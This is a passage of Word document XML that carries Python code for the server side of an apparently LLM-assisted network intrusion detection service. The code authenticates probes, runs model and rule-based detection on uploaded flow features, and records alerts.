        <w:t xml:space="preserve">    app.state.rules = RuleEngine()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71581FEF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B1A5B5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        f"[中心] 模型已加载：{app.state.detector.selected_by or '未知选型口径'}；"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56384C9C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        f"大模型 {'可用' if app.state.llm.available else '未配置 key，将输出模板报告'}",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B12F904">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        flush=True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08F52644">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094BCC46">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    yield</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="238B1FF1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39AF11BD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7655601F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>app = FastAPI(title="NetSentinel-LLM 中心服务", version="0.1.0", lifespan=lifespan)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A154CAF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5DA27DA6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48BE48AB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def require_token(token: str | None) -&gt; None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="404BC136">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    expected = app.state.cfg["center"]["token"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A30D7FD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not token or not hmac.compare_digest(str(token), str(expected)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6537C043">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        raise HTTPException(status_code=401, detail="探针 token 无效")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FC6D4E0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="224E0147">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08D38EFA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ---------------------------------------------------------------- 上报与推理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50823791">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F125019">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3BD28EE7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>@app.post("/api/v1/report")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="453D7FCA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def report(body: ReportIn, background: BackgroundTasks, x_probe_token: str | None = Header(default=None)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04707438">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    require_token(x_probe_token)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AA3BDCA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if len(body.flows) &gt; MAX_FLOWS_PER_REPORT:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="528938EE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        raise HTTPException(413, f"单批流数超过上限 {MAX_FLOWS_PER_REPORT}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A5FE3AB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not body.flows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F6B796">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return {"accepted": 0, "alerts": 0, "alert_ids": []}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3967D87F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2186FF2D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    detector: Detector = app.state.detector</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="301DC9F5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 列序不符直接拒收：宁可丢一批数据，也不能用错位的特征去推理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D67E07D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22A7EC07">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        detector.check_features(body.feature_names)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B72C4AC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    except ValueError as exc:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10FA5FE5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        raise HTTPException(400, f"特征列不符：{exc}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B00FA03">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="078BA58D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    store: Store = app.state.store</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AE75DE1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    rules: RuleEngine = app.state.rules</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F85D841">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    values = [f.values for f in body.flows]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="099A8FFD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    preds = detector.predict_batch(values)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FACC9CF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31659EA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    alert_ids = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77FA5FBE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for flow, pred in zip(body.flows, preds):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E981F62">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        feats = dict(zip(body.feature_names, flow.values))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="479DB189">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        store.add_flow(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FFC458C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            body.probe_id, flow.first_seen, flow.last_seen, flow.key,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74ED5C74">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            pred["category"], pred["confidence"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CEF9EE8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            feats,   # 原始特征，复盘误报用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD0ACF2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="134DAE13">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26C5291B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        # 规则层与模型层并行跑。模型判正常而规则命中时照样出告警——</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58EDE675">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        # 那正是"数据集里没见过的采集形态"，也是规则层存在的理由。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="644CD39A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ts = flow.last_seen or flow.first_seen or time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D2BC7B5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        hit = pick(rules.observe(body.probe_id, ts, flow.key, feats))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00151D19">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57C5D4B5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if pred["category"] != "BENIGN":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D313304">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            evidence = detector.top_features(flow.values, k=5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F7D7BD5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if hit is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7198A999">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                evidence.append(hit.as_evidence())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F9CDE3D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            alert_ids.append(store.add_alert(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4219EEFE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                body.probe_id, flow.key, pred["category"], pred["confidence"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FA26718">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                pred["risk"], feats, evidence, source="model",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16266330">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
